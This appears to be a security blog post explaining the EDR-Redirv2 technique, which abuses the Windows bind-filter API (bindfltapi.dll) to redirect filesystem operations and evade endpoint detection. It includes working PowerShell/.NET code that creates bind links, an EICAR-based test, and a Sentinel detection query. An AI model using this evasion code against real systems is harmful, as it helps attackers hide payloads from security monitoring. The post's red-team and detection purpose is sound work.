---
title: "0ffS3c: EDR-Redirv2"
date: 2025-11-03T10:39:40+01:00
draft: true
---

Happy me! I am announcing yet-another series called **0ffS3c**. It is intended to highlight novel TTPs as well as redteaming engagements.
The reason of me conducting small redteam engagements is to understand better how vulnerable we really are and in order to better detect potentially malicious activities. Also offsec is my small side-passion besides threat hunting and reverse engineering.

Today, I stumbled across [EDR-Redirv2](https://github.com/TwoSevenOneT/EDR-Redir) by @TwoSevenOneT. Essentially he proposed a new way to confuse EDRs such as Windows Defender by redirecting filesystem activities using an undiscovered Windows API called ```bindfltapi.dll```. 

## How does it work?

Essentially the used ```bindfltapi.dll``` api allows an user to create so called bind links in order to redirect filesystem operations from a source folder to a specified destination folder. The author states the following crazy usecase:

> EDR-Redir uses a Bind Filter (mini filter bindflt.sys) to redirect the Endpoint Detection and Response (EDR) 's working folder to a folder of the attacker's choice. Alternatively, it can make the folder appear corrupt to prevent the EDR's process services from functioning.

AWESOME. Right? Yep. Now lets assume we have **Folder A** and **Folder B**. Lets also assume we drop a payload into folder A and create a bind link towards folder B. Then we launch a process calling or loading that process into memory from folder B. Now the process will perform filesystem operations originating from within folder A, **BUT** but it appears as though it is ran from folder B. Therefore EDRs will monitor only ops from folder B eventough the payload resides in folder A. Crazy.

I have before-handedly, compiled and tested the [original C++ implementation](https://github.com/TwoSevenOneT/EDR-Redir/blob/master/EDR-Redir.cpp) on a Windows11 24H2 system with Defender for Endpoint enabled. Sadly it seems to be already flagged by MDE so much that it immediately quarantines and prevents the process. Ok so I then went on to test a custom implementation by using **PowerShell and .NET Assembly**. Lets go through it:

```powershell
$code = @"
using System;
using System.Runtime.InteropServices;

public class BindFilter
{
    [DllImport("bindfltapi.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int BfSetupFilter(
        IntPtr jobHandle,
        uint flags,
        string virtualPath,
        string backingPath,
        uint exceptionCount,
        IntPtr exceptionPaths
    );

    [DllImport("bindfltapi.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int BfRemoveMapping(
        IntPtr reserved,
        string backingPath
    );
}
"@
Add-Type -TypeDefinition $code


$virtualPath = "C:\MyVirtual"
$backingPath = "C:\MyBacking"
$result = [BindFilter]::BfSetupFilter([IntPtr]::Zero, 0, $virtualPath, $backingPath, 0, [IntPtr]::Zero)
```

The variable ```$code``` stores .NET C# code. The .NET code loads ```bindfltapi.dll``` and initializes two different Functions. One for creation of new bind links and one obviously for removal of existing bind links. Then we load ```$code``` into memory as new .NET type so we can call it from PowerShell. Then we define two variables. One for our source path (C:\MyVirtual) and one for destination path (C:\MyBacking). Finally we call the creation functionality that we have defined earlier and pass our source- and destination paths as parameters.

Perfect. So now we can start dropping some payload into ```$virtualPath```. I have tested with a barebones EICAR string as follows:

```powershell
$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
Set-Content -Path "C:\MyBacking\eicar.com" -Value $eicar -Encoding ASCII
Start-Process "C:\MyVirtual\eicar.com"
Get-ChildItem -Path C:\MyBacking\
```

Executing it will result in Defender for Endpoint preventing the process from **MyBacking** (which is the destination folder from out bind link) and eventually removing the file.
Yet, the file is still accessible and visible in **MyVirtual** (which is our source folder).

## Detecting bind links

You can filter for DLL Load events through ```DeviceImageLoadEvents``` table in Microsoft Sentinel

```sql
DeviceImageLoadEvents
| where FileName has "bindfltapi"
| project TimeGenerated, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, FolderPath
```
